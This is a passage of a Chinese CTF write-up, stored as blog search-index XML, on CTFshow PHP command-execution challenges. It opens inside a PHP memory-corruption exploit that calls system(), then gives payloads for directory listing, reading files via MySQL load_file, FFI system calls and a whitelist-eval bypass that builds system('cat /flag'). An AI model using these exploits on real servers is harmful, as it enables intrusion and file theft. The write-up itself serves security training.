class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>é¦–å…ˆæŸ¥æ‰¾flagä½ç½®,ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«å¾—åˆ°flag</p><p>Payload:</p><blockquote><p>1ã€c&#x3D;var_export(scandir(â€˜&#x2F;â€˜));exit(0);c&#x3D;require_once(â€˜&#x2F;flagc.txtâ€™);exit(0);</p><p>2ã€c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(â€˜flagc.txtâ€™);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandirå‡½æ•°è¢«banäº†ï¼Œä½¿ç”¨DirectoryIteratorç±»ï¼Œflagåœ¨&#x2F;flagx.txt</p><p>æˆ–è€…ä½¿ç”¨globåè®®</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(â€˜..&#x2F;..&#x2F;..â€™.â€™&#x2F;*â€™));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>å¯ä»¥æŸ¥åˆ°flagä½ç½®ï¼š&#x2F;flag36.txt  ä½†æ˜¯includeè¢«banäº†ï¼Œä¹‹å‰çš„pocå› ä¸ºstrlenè¢«ç¦äº†è·å–ä¸åˆ°systemåœ°å€ä¹Ÿæ²¡æ³•ç”¨äº†</p><p>å¯ä»¥ä½¿ç”¨mysqlçš„load_fileå‡½æ•°</p><p>å…ˆæŸ¥è¯¢æ•°æ®åº“</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŸ¥åˆ°äº†ctftrainingçš„æ•°æ®åº“ï¼Œç„¶åä½¿ç”¨load_fileè¯»å–flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>PayloadåŒä¸Š</p><h4 id="web77-FFI-php7-4ä»¥ä¸Š"><a href="#web77-FFI-php7-4ä»¥ä¸Š" class="headerlink" title="web77(FFI php7.4ä»¥ä¸Š)"></a>web77(FFI php7.4ä»¥ä¸Š)</h4><p>FFIï¼Œphp7.4ä»¥ä¸Šæ‰æœ‰</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(â€œint system(const char *command);â€);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡<br>$a&#x3D;â€™&#x2F;readflag &gt; 1.txtâ€™;   &#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦é‡å®šå‘åˆ°æ–‡ä»¶<br>$ffi-&gt;system($a);       &#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</p></blockquote><h4 id="web118-Bashå†…ç½®å˜é‡"><a href="#web118-Bashå†…ç½®å˜é‡" class="headerlink" title="web118(Bashå†…ç½®å˜é‡)"></a>web118(Bashå†…ç½®å˜é‡)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCNåˆèµ›åŸé¢˜</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: æ”¶é›†è‡ªç½‘ç»œ# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>ä»£ç å®¡è®¡</strong></p><p>ä»£ç æ¥å—GETä¼ å‚<code>c</code>ï¼Œä¿å­˜åœ¨<code>content</code>ä¸­ï¼Œå¹¶å¯¹å‚æ•°é•¿åº¦è¿›è¡Œäº†é™åˆ¶<code>&lt;80</code>ã€‚</p><p>ç„¶åè®¾ç½®äº†ä¸€ä¸ªé»‘åå•ï¼Œè¿‡æ»¤äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œ<code>ç©ºæ ¼</code>å’Œ<code>/</code>ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥<code>cat /flag</code>æ— é—¨ã€‚</p><p>æ¥ä¸‹æ¥æä¾›äº†ä¸€ä¸ªç™½åå•ï¼Œé‡Œé¢æ˜¯ä¸€äº›æ•°å­¦å‡½æ•°ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå¸¸ç”¨æ•°å­¦å‡½æ•°çš„é“¾æ¥ï¼Œå¯ä»¥æŸ¥åˆ°è¿™äº›å‡½æ•°çš„ç”¨æ³•ã€‚</p><p>éƒ½æ»¡è¶³ä»¥ä¸Šæ¡ä»¶åï¼Œä½¿ç”¨<code>eval</code>æ¥æ‰§è¡Œä¼ å…¥çš„å‚æ•°ã€‚</p><p>åˆ†æåˆ°è¿™é‡Œï¼Œåªèƒ½åˆ©ç”¨ç™½åå•ä¸­æä¾›çš„å‡½æ•°æ¥æ„é€ å‘½ä»¤ï¼Œç”¨åˆ°çš„å‡½æ•°æœ‰ï¼š</p><ul><li><code>base_convert()</code>ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li><li><code>dechex()</code>ï¼šå°†åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</li><li><code>hex2bin()</code>ï¼šå°†åå…­è¿›åˆ¶è½¬æ¢æˆasciiå­—ç¬¦</li></ul><p><strong>æ€è·¯æ˜¯ï¼šå…ˆåˆ©ç”¨<code>dechex()</code>å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œå†åˆ©ç”¨<code>hex2bin()</code>å°†å¾—åˆ°çš„åå…­è¿›åˆ¶æ•°è½¬æ¢æˆasciiå­—ç¬¦ä¸²ã€‚åˆå› ä¸ºç™½åå•é‡Œæ²¡æœ‰<code>hex2bin()</code>è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨<code>base_convert()</code>æ¥å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ï¼ˆå› ä¸ºä¸‰åå…­è¿›åˆ¶ä¸­å«æœ‰æ•°å­—å­—æ¯ï¼‰æ„é€ å‡º<code>hex2bin</code>ï¼Œæœ€åå°†åˆ†åˆ«ä¼ å…¥çš„å­—ç¬¦ä¸²æ‹¼æ¥å³å¯æ„é€ æˆåŠŸã€‚</strong></p><p>*Trickï¼šåè¿›åˆ¶æ•°<code>37907361743</code>è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ä¹‹åæ­£å¥½å°±æ˜¯<code>hex2bin</code>ã€‚</p><p>å› ä¸ºä»£ç ä¸­å¯¹ä¼ å…¥çš„å‚æ•°<code>c</code>åšäº†é•¿åº¦é™åˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡ä¼ å…¥å…¶å®ƒå‚æ•°ï¼Œåœ¨æ„é€ å‡ºæ¥çš„è¯­å¥ä¸­è°ƒç”¨å³å¯ã€‚</p><p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒPHPä¸­å¯ä»¥å°†å‡½æ•°åä¿å­˜åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå˜é‡æ¥æ›¿ä»£å‡½æ•°åï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>åˆ©ç”¨ä»¥ä¸ŠçŸ¥è¯†ç‚¹ï¼Œå°è¯•æ„é€ å¦‚ä¸‹payloadï¼š</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>æ„é€ è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;å¯ä»¥ä»£æ›¿[]ç»¼ä¸Šï¼š$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GETï¼Œå³æ­¤æ—¶çš„$piå°±æ˜¯_GET</code></pre><p>æ‹¼æ¥å½¢æˆpayloadï¼š</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;è¦åœ¨è¯·æ±‚å¤´é‡Œé¢åŠ ä¸€ä¸ª  1:tac flag.php  è§ä¸‹å›¾</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
